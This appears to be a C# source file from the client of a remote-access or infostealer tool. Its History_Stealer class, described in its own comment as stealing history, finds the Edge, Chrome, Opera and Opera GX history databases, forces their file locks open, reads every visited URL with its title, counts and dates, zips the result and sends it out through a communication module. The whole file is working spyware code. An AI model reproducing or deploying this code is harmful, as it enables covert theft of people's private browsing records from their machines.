using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;
using System.Windows.Forms;
using SQLite;

namespace Client.Armitage.Cookies
{
    /// <summary>
    /// Steals history from all supported browsers.
    /// </summary>
    public static class History_Stealer
    {
        [Table("urls")]
        public class HistoryTable
        {
            public long id { get; set; }

            public string url { get; set; }
            public string title { get; set; }
            public long visit_count { get; set; }
            public long typed_count { get; set; }
            public long last_visit_time { get; set; }
            public byte hidden { get; set; }
        }
        private static DateTime _ge = DateTime.Parse("1601-01-01");
        public static bool FromEdge()
        {
            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Edge");
        }
        public static bool FromChrome()
        {
            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\History", "Chrome");
        }
        public static bool FromOpera()
        {
            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\History", "Opera");
        }
        public static bool FromOperaGX()
        {
            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\History", "Opera GX");
        }
        public static bool ParseAndSendSQL(string pathtosql, string browsername)
        {
            try
            {
                Console.WriteLine("trying : " + pathtosql);
                if (File.Exists(pathtosql))
                {
                    Console.WriteLine("Found! " + pathtosql);

                    Utilities.Files_And_Pathing.KillLocks(pathtosql);

                    string tempname = Path.GetTempFileName() + "e";

                    File.Copy(pathtosql, tempname);

                    var con = new SQLiteConnection(pathtosql);

                    string stm = "SELECT * FROM urls";

                    StringBuilder sb = new StringBuilder();

                    sb.AppendLine($"History From {pathtosql}");

                    sb.AppendLine($"id | url | site title | visit count | typed count | last visit | ishidden");

                    var history = con.Query<HistoryTable>(stm).ToList();

                    foreach (var j in history)
                    {
                        try
                        {
                            long seconds = j.last_visit_time / 1000000;

                            DateTime visitdate = _ge.AddSeconds(seconds);
                            if (visitdate > Properties.Settings.Default.LastHistorySent)
                                sb.AppendLine($"{j.id} | {j.url} | {j.title} | {j.visit_count} | {j.typed_count} | {visitdate} | {Convert.ToInt32(j.hidden)}");
                        }
                        catch { }
                    }

                    Console.Write("History : " + sb.ToString());

                    Utilities.Zip_Creator k = new Utilities.Zip_Creator();

                    k.AddTextFile(sb.ToString(), "History.txt");

                    var btyes = k.CreateZip();

                    // send history
                    Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, $"{browsername}-History.zip");

                    return true;
                }
            }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }

            return false;
        }
        public static void SendOne()
        {
            Task.Run(() =>
            {
                FromEdge();

                FromChrome();

                FromOpera();

                FromOperaGX();

                Properties.Settings.Default.LastHistorySent = Constants.Today;

                Properties.Settings.Default.Save();
            });
        }
    }
}
